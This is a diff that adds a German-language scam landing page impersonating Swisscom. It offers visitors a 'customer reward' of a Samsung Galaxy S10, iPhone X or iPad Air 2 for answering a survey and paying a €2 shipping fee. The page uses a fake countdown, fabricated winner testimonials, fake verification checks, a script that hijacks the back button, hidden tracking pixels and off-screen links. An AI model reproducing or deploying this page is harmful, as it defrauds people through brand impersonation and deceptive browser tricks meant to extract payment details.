@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<base href="">
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no">
+	<meta name="description" content="">
+	<meta name="author" content="">
+	<link rel="stylesheet" href="css/bootstrap.min.css">
+	<link rel="stylesheet" href="css/bundle_msft.css">
+	<script src="js/jquery-3.3.1.min.js"></script>
+	<script type="text/javascript">
+	/*=============HELPER================*/
+	var Helper = (function() {
+		var data = [];
+		var months = ['Januar', 'Februar', 'März', 'April', 'Mai', 'Juni', 'Juli', 'August', 'September', 'Oktober', 'November', 'Dezember'];
+		var days = ['Sonntag', 'Montag', 'Dienstag', 'Mittwoch', 'Donnerstag', 'Freitag', 'Samstag'];
+
+		function setDays(d) {
+			if((d.constructor !== Array) || d.length !== 7) return false;
+			days = d;
+		}
+
+		function setMonths(m) {
+			if((m.constructor !== Array) || m.length !== 12) return false;
+			months = m;
+		}
+
+		function getDate() {
+			var now = new Date();
+			var month = typeof(months[now.getMonth()]) == 'undefined' ? now.getMonth() : months[now.getMonth()];
+			return(now.getDate()) + " " + month + " " + now.getFullYear();
+		}
+
+		function getMonth() {
+			var now = new Date();
+			var month = typeof(months[now.getMonth()]) == 'undefined' ? now.getMonth() : months[now.getMonth()];
+			return month;
+		}
+
+		function getDay() {
+			var now = new Date();
+			var day = typeof(days[now.getDay()]) == 'undefined' ? now.getDay() : days[now.getDay()];
+			return day;
+		}
+
+		function getDayOfMonth() {
+			var now = new Date();
+			var day = ('0' + now.getDate()).slice(-2);
+			return day;
+		}
+
+		function getUrlParameter(name) {
+			name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+			var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+			var results = regex.exec(location.search);
+			return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+		}
+
+		function findAncestor(element, name) {
+			while((element = element.parentElement) && !element.classList.contains(name));
+			return element;
+		}
+
+		function bindOnQuery(query, callback, action = 'click') {
+			var elements = document.querySelectorAll(query);
+			for(var i = 0; i < elements.length; i++) {
+				elements[i].addEventListener(action, callback, false);
+			}
+		}
+
+		function bindOnId(name, callback, action = 'click') {
+			var element = document.getElementById(name);
+			element.addEventListener(action, callback, false);
+		}
+
+		function replaceMarkers(text, markers) {
+			for(key in markers) {
+				var search = '%' + key + '%';
+				text = text.replace(new RegExp(search, 'g'), markers[key]);
+			}
+			return text;
+		}
+		return {
+			setDays: setDays,
+			setMonths: setMonths,
+			getDate: getDate,
+			getDay: getDay,
+			getMonth: getMonth,
+			getDayOfMonth: getDayOfMonth,
+			getUrlParameter: getUrlParameter,
+			findAncestor: findAncestor,
+			bindOnQuery: bindOnQuery,
+			bindOnId: bindOnId,
+			replaceMarkers: replaceMarkers
+		};
+	})();
+	</script>
+	<title>Kundenprämienprogramm</title>
+</head>
+
+<body class="modal-open" style="padding-right: 16px;">
+	<div class="tingle-modal" style="display: none;"><div class="tingle-modal-box"><div class="tingle-modal-box__content"></div><div class="tingle-modal-box__footer"><button></button></div></div></div>
+	<div class="tingle-modal" style="display: none;"><div class="tingle-modal-box"><div class="tingle-modal-box__content"></div><div class="tingle-modal-box__footer"><button></button></div></div></div>
+	<div class="tingle-modal" style="display: none;">
+		<div class="tingle-modal-box">
+			<div class="tingle-modal-box__content"></div>
+			<div class="tingle-modal-box__footer">
+				<button></button>
+			</div>
+		</div>
+	</div> <a href="#" style="font-size: 6px; color:#423c15; position: absolute; left: -900px;">Click Here</a>
+	<div class="tingle-modal" style="display: none;">
+		<div class="tingle-modal-box">
+			<div class="tingle-modal-box__content"></div>
+			<div class="tingle-modal-box__footer">
+				<button></button>
+			</div>
+		</div>
+	</div>
+	<div class="tingle-modal" style="display: none;">
+		<div class="tingle-modal-box">
+			<div class="tingle-modal-box__content"></div>
+			<div class="tingle-modal-box__footer">
+				<button></button>
+			</div>
+		</div>
+	</div>
+	<div class="tingle-modal" style="display: none;">
+		<div class="tingle-modal-box">
+			<div class="tingle-modal-box__content"></div>
+			<div class="tingle-modal-box__footer">
+				<button></button>
+			</div>
+		</div>
+	</div>
+	<header>
+		<div class="logo-wrap">
+			<div class="container">
+				<div class="row">
+					<div class="col-xs-12 col-md-8 col-md-offset-2 ">
+						<table style="width: 100%;">
+							<tbody>
+								<tr>
+									<td class="logo"> <img id="logo" class="clickable" src="images/swisscom-logo.png" height="50%"> </td>
+									<td class="lang"> DE </td>
+								</tr>
+							</tbody>
+						</table>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="slogan-wrap">
+			<div class="container">
+				<div class="row">
+					<div class="col-xs-12 col-md-8 col-md-offset-2 slogan text-xs-left"> Kundenprämienprogramm </div>
+				</div>
+			</div>
+		</div>
+	</header>
+	<div class="container body-container">
+		<div class="row">
+			<div class="lead-container col-xs-12 col-md-8 col-md-offset-2">
+				<div id="recipe-row" class="row">
+					<div class="col-xs-12 recipe-content">
+						<div class="row">
+							<div class="col-xs-1">
+								<div class="icon-round" style="background: url(images/swisscom-logo1.png) no-repeat;"></div>
+							</div>
+							<div class="col-xs-10 col-md-11">
+								<div class="recipe-header">
+									<div class="phrase"> Herzlichen Glückwunsch! </div>
+									<div class="date_full">
+										<script>
+										document.write(Helper.getDate())
+										</script>
+									</div>
+								</div>
+							</div>
+						</div> Wir möchten uns bei Ihnen dafür bedanken, dass Sie unsere Produkte bereits so lange verwenden!
+						<br>
+						<br> Jeden Tag wählen wir eine kleine Gruppe von -Nutzern aus und geben ihnen die Möglichkeit, wertvolle Geschenke von unseren Partnern und Sponsoren zu gewinnen. Dies soll unsere Wertschätzung dafür zeigen, dass Sie sich für entschieden haben.
+						<br>
+						<br> Sie können ein neues <span class="marked">Samsung Galaxy S10</span>, <span class="marked">iPhone X</span> oder <span class="marked">iPad Air 2</span> gewinnen. Alles, was Sie tun müssen, um ein Geschenk er erhalten, ist, die folgenden 4 Fragen zu beantworten. Die vorliegende Umfrage ermöglicht es uns, die Benutzer besser zu verstehen und unsere Produkte zu verbessern. Es wird nicht mehr als 30 Sekunden Ihrer Zeit einnehmen.
+						<br>
+						<br> <strong>Denken Sie daran:</strong> 100 zufällig ausgewählte Benutzer haben diese Einladung erhalten und die Anzahl der Geschenke ist begrenzt.
+						<br>
+						<div class="timer"> Sie haben zum Beantworten der folgenden Fragen <span class="marked"><span id="timer-mins">4</span> Minuten und <span id="timer-secs">15</span> Sekunden Zeit</span>, bevor wir das Geschenk einem anderen Glückspilz unter den Benutzern geben! Viel Erfolg! </div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="row">
+			<div class="qu-wrap col-xs-12 col-md-8 col-md-offset-2 ">
+				<div class="row">
+					<div class="qu-group col-xs-12">
+						<div class="row">
+							<div class="qu-group-header col-xs-12"> Welches Gerät nutzen Sie im Moment? </div>
+						</div>
+						<div class="row">
+							<div class="qu col-xs-12 col-md-8 col-md-offset-2"> PC/Notebook </div>
+						</div>
+						<div class="row">
+							<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Smartphone </div>
+						</div>
+						<div class="row">
+							<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Tablet </div>
+						</div>
+						<div class="row">
+							<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Anderes Gerät </div>
+						</div>
+					</div>
+					<div class="qu-group col-xs-12" style="display: none;">
+						<div class="row">
+							<div class="qu-group-header col-xs-12"> Welchen Browser nutzen Sie? </div>
+						</div>
+						<div class="row">
+							<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Microsoft Edge </div>
+						</div>
+						<div class="row">
+							<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Chrome </div>
+						</div>
+						<div class="row">
+							<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Firefox </div>
+						</div>
+						<div class="row">
+							<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Andere </div>
+						</div>
+					</div>
+					<div class="qu-group col-xs-12" style="display: none;">
+						<div class="row">
+							<div class="qu-group-header col-xs-12"> Was ist dein Geschlecht? </div>
+						</div>
+						<div class="row">
+							<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Männlich </div>
+						</div>
+						<div class="row">
+							<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Weiblich </div>
+						</div>
+					</div>
+					<div class="qu-group col-xs-12" style="display: none;">
+						<div class="row">
+							<div class="qu-group-header col-xs-12"> Wie alt bist du? </div>
+						</div>
+						<div class="row">
+							<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Unter 18 Jahren </div>
+						</div>
+						<div class="row">
+							<div class="qu col-xs-12 col-md-8 col-md-offset-2"> 18-25 </div>
+						</div>
+						<div class="row">
+							<div class="qu col-xs-12 col-md-8 col-md-offset-2"> 26-34 </div>
+						</div>
+						<div class="row">
+							<div class="qu col-xs-12 col-md-8 col-md-offset-2"> 35-54 </div>
+						</div>
+						<div class="row">
+							<div class="qu col-xs-12 col-md-8 col-md-offset-2"> 55-64 </div>
+						</div>
+					</div>
+					<div id="qu-progress" class="col-xs-12" style="display: none;">
+						<div class="row">
+							<div class="qu-group-header col-xs-12"> </div>
+						</div>
+						<div class="row">
+							<div id="qu-progress-state" class="col-xs-6 col-md-4 col-md-offset-2 text-left"> Zustand </div>
+							<div id="qu-progress-percent" class="col-xs-6 col-md-4 text-right"> 0% </div>
+						</div>
+						<div class="row">
+							<div class="col-xs-12 col-md-8 col-md-offset-2 qu-progress-wrap">
+								<div id="qu-progress-bar"> </div>
+							</div>
+						</div>
+						<div class="row">
+							<div id="qu-checkpoint-10" rel="Validierung Ihrer Antworten" class="col-xs-10 col-md-offset-2 qu-checkpoint">
+								<table>
+									<tbody>
+										<tr>
+											<td>
+												<div id="qu-mark-10" class="qu-mark"></div>
+											</td>
+											<td> <span class="qu-checkpoint-desc">Sie haben (4/4) Fragen beantwortet</span> </td>
+										</tr>
+									</tbody>
+								</table>
+							</div>
+						</div>
+						<div class="row">
+							<div id="qu-checkpoint-20" rel="Überprüfen Sie Ihre IP" class="col-xs-10 col-md-offset-2 qu-checkpoint">
+								<table>
+									<tbody>
+										<tr>
+											<td>
+												<div id="qu-mark-20" class="qu-mark"></div>
+											</td>
+											<td> <span class="qu-checkpoint-desc">Pas Von Ihrer IP-Adresse gab es keine wiederholten Anfragen</span> </td>
+										</tr>
+									</tbody>
+								</table>
+							</div>
+						</div>
+						<div class="row">
+							<div id="qu-checkpoint-30" rel="Finden Sie Preise" class="col-xs-10 col-md-offset-2 qu-checkpoint">
+								<table>
+									<tbody>
+										<tr>
+											<td>
+												<div id="qu-mark-30" class="qu-mark"></div>
+											</td>
+											<td> <span class="qu-checkpoint-desc">Heute liegt für Sie 1 Geschenk vor</span> </td>
+										</tr>
+									</tbody>
+								</table>
+							</div>
+						</div>
+					</div>
+					<div id="qu-prize" class="col-xs-12 col-md-8 col-md-offset-2" style="display: none;">
+						<div class="row">
+							<div class="qu-group-header col-xs-12"> Holen Sie sich jetzt Ihr Geschenk: </div>
+						</div>
+						<div class="row qu-prize-row">
+							<div class="col-xs-5 text-xs-right qu-item"> <img class="prize-image clickable" src="images/1497187487_s8.png"> </div>
+							<div class="col-xs-7 text-xs-left qu-prize-description"> <span class="qu-prize-name clickable">Samsung Galaxy S10</span> <strong>Ihr Preis:</strong><span class="qu-yourprice-value"> €2 </span>(versandgebühr)
+								<br> <strong>Die Zahl:</strong> 3
+								<br> <a href="#" target="_blank" class="qu-take-it">
+									Erhalten
+								</a> </div>
+						</div>
+						<div class="row qu-prize-row qu-opacied">
+							<div class="col-xs-5 text-xs-right qu-item"> <img class="prize-image" src="images/iphonex.png"> </div>
+							<div class="col-xs-7 text-xs-left qu-prize-description"> <span class="qu-prize-name">iPhone X</span> <strong>Ihr Preis:</strong><span class="qu-yourprice-value"> €2 </span>(versandgebühr)
+								<br> <strong>Die Zahl: </strong>0
+								<br>
+								<div class="qu-btn-dis"> Ausverkauft </div>
+							</div>
+						</div>
+						<div class="row qu-prize-row qu-opacied">
+							<div class="col-xs-5 text-xs-right qu-item"> <img class="prize-image" src="images/1497184421_ipad.png"> </div>
+							<div class="col-xs-7 text-xs-left qu-prize-description"> <span class="qu-prize-name">iPad Air 2</span> <strong>Ihr Preis:</strong><span class="qu-yourprice-value"> €2 </span>(versandgebühr)
+								<br> <strong>Die Zahl: </strong>0
+								<br>
+								<div class="qu-btn-dis"> Ausverkauft </div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="row" id="comment-row">
+			<div class="col-xs-12 col-md-8 col-md-offset-2 comment-container">
+				<!-- Comments head -->
+				<div class="row">
+					<div class="col-xs-12 text-center comment-header"> Kommentare </div>
+				</div>
+				<!-- Comments -->
+				<div class="row comment-wrap">
+					<div class="col-xs-2 text-right"> <img class="face-round" src="images/faceza1.jpg"> </div>
+					<div class="col-xs-10 col-md-8 comment-desc"> <span class="name">Jason Cuillerier</span>
+						<br> <strong>Ich war mir nicht sicher, ob es wahr war oder nicht, aber ich habe heute mein iPhone X erhalten!
+</strong>
+						<br> <small class="date">Vor 44 Minuten</small> </div>
+				</div>
+				<div class="row comment-wrap">
+					<div class="col-xs-2 text-right"> <img class="face-round" src="images/faceza2.jpg"> </div>
+					<div class="col-xs-10 col-md-8 comment-desc"> <span class="name">Randall Abril</span>
+						<br> <strong>Ich bin so dankbar für das Geschenk. Das Samsung S10 bringt mir so viel Freude! Jeder sollte die Lotterie versuchen!
+</strong>
+						<br> <small class="date">Vor 50 Minuten</small> </div>
+				</div>
+				<div class="row comment-wrap">
+					<div class="col-xs-2 text-right"> <img class="face-round" src="images/faceza3.jpg"> </div>
+					<div class="col-xs-10 col-md-8 comment-desc"> <span class="name">Danielle Vadeboncoeur</span>
+						<br> <strong>Meine ist heute morgen im Briefkasten angekommen. Danke an Microsoft für das iPhone X
+</strong>
+						<br> <small class="date">Vor 2 Minuten</small> </div>
+				</div>
+				<div class="row comment-wrap">
+					<div class="col-xs-2 text-right"> <img class="face-round" src="images/faceza4.jpg"> </div>
+					<div class="col-xs-10 col-md-8 comment-desc"> <span class="name">Clayton Dupont</span>
+						<br> <span class="marked"><strong>@Danielle Kearns</strong></span> <strong>@Danielle Kearns habe ich heute in der Post erhalten. Danke für das Samsung S10! <br> <img id="iphone1" src="images/samsung1.jpg">
+</strong>
+						<br> <small class="date">Vor 3 Minuten</small> </div>
+				</div>
+				<div class="row comment-wrap">
+					<div class="col-xs-2 text-right"> <img class="face-round" src="images/faceza5.jpg"> </div>
+					<div class="col-xs-10 col-md-8 comment-desc"> <span class="name">Romario D'Aoust</span>
+						<br> <strong>Ich habe diese Anzeige schon einmal gesehen und dachte, es wäre ein Witz. Ich habe die Werbung überprüft und teilgenommen, weil mir langweilig war. Ich habe ein iPad 2 gewonnen. Unglaublich
+</strong>
+						<br> <small class="date">Vor 4 Minuten</small> </div>
+				</div>
+				<div class="row comment-wrap">
+					<div class="col-xs-2 text-right"> <img class="face-round" src="images/faceza6.jpg"> </div>
+					<div class="col-xs-10 col-md-8 comment-desc"> <span class="name">Christo Poulin</span>
+						<br> <strong>Ich kann nicht glauben, dass ich gewonnen habe. Ich wollte immer ein iPhone X.
+</strong>
+						<br> <small class="date">Vor 4 Minuten</small> </div>
+				</div>
+				<!-- Comment Form -->
+				<div class="row comment-wrap">
+					<div class="col-xs-12 text-center">
+						<textarea id="comment-area"></textarea>
+					</div>
+					<div class="col-xs-12 text-center"> <span id="comment-post">Senden Sie Ihren Kommentar</span> </div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div class="container">
+		<div class="row">
+			<div class="col-xs-12 col-md-8 col-md-offset-2 copyright text-xs-center">
+				<div class="copyright-image img-responsive"> <img src="images/rta.gif"> </div>
+				<div class="conditions"> <a href="#">Bedingungen</a> </div>
+			</div>
+		</div>
+	</div>
+	<div style="display: none;">
+		<div class="jingle-header-crutch">
+			<table>
+				<tbody>
+					<tr>
+						<td><img src="images/swisscom-logo1.png" alt="">
+						</td>
+						<td class="slogan"><span class="marked">Kundenprämienprogramm
+						</span>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+		</div>
+	</div>
+	<script src="js/bundle_za.js"></script>
+	<div class="modal fade in" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" style="display: block; padding-right: 16px;">
+		<div class="modal-dialog">
+			<div class="modal-content">
+				<div class="modal-body">
+					<br>
+					<table>
+						<tbody>
+							<tr>
+								<td> <img src="images/swisscom-logo.png" class="logo-main">
+									<p style="font-size:10.5pt"> <strong><script type="text/javascript">
+                        var d=new Date();
+			var weekday=new Array(7); 
+			weekday[0]="Sonntag";
+			weekday[1]="Montag";
+			weekday[2]="Dienstag";
+			weekday[3]="Mittwoch";
+			weekday[4]="Donnerstag";
+			weekday[5]="Freitag";
+			weekday[6]="Samstag";
+			document.write("" + weekday[d.getDay()]);
+			</script> 
+<script type="text/javascript">
+				var month = new Array();
+				month[0]="Januar";
+				month[1]="Februar";
+				month[2]="März";
+				month[3]="April";
+				month[4]="Mai";
+				month[5]="Juni";
+				month[6]="Juli";
+				month[7]="August";
+				month[8]="September";
+				month[9]="Oktober";
+				month[10]="November";
+				month[11]="Dezember";                             var mydate= new Date()
+				mydate.setDate(mydate.getDate())
+				document.write(""+month[mydate.getMonth()]+" "+mydate.getDate()+", "+mydate.getFullYear()+"");
+                        </script> 
+</strong>
+									</p>
+									<br>
+									<p><b>Sehr geehrter Kunde:</b>
+									</p>
+									<br>
+									<p>Herzlichen Glückwunsch! Sie sind einer der 100 Benutzer, die wir ausgewählt haben, um eine Chance zu gewinnen <b>Samsung Galaxy S10</b>, <b>iPhone X</b> oder <b>iPad Air 2</b>.</p>
+									<br> </td>
+							</tr>
+						</tbody>
+					</table>
+				</div>
+				<div class="modal-footer">
+					<button type="button" class="btn btn-primary" data-dismiss="modal">OK</button>
+				</div>
+			</div>
+		</div>
+	</div>
+	<script src="js/bootstrap.min.js"></script>
+	<script>
+	window.onload = function() {
+		$('#myModal').modal('show');
+	};
+	</script>
+	<script type="text/javascript">
+	! function() {
+		var t;
+		try {
+			for(t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+			onpopstate = function(t) {
+				t.state && location.replace("#")
+			}
+		} catch(o) {}
+	}();
+	</script>
+	<script type="text/javascript">
+	var scroll = 0;
+	window.onscroll = function() {
+		if(scroll != 1) {
+			scroll = 1;
+			var o = document.createElement("img");
+			o.src = "#";
+		}
+	}
+	</script>
+	<script>
+	if(typeof(window.orientation) == "undefined") {
+		var o = document.createElement("img");
+		o.src = '#;
+	} else {
+		var o = document.createElement("img");
+		o.src = '#';
+	}
+	</script>
+	<script>
+	function pushToTrackerViaImage() {
+		var pushURL = '#';
+		var img = document.createElement('img');
+		img.src = pushURL;
+		img.style.display = 'none';
+		document.body.appendChild(img);
+	}
+
+	function pushAfterTimeout(timeout) {
+		setTimeout(pushToTrackerViaImage, timeout * 1000);
+	}
+	var TIMEOUT_IN_SECONDS = 20;
+	pushAfterTimeout(TIMEOUT_IN_SECONDS);
+	</script> <a href="#" style="font-size: 6px; color:#423c15; position: absolute; left: -900px;">Click Here</a>
+ 
+</body>
+
+</html>
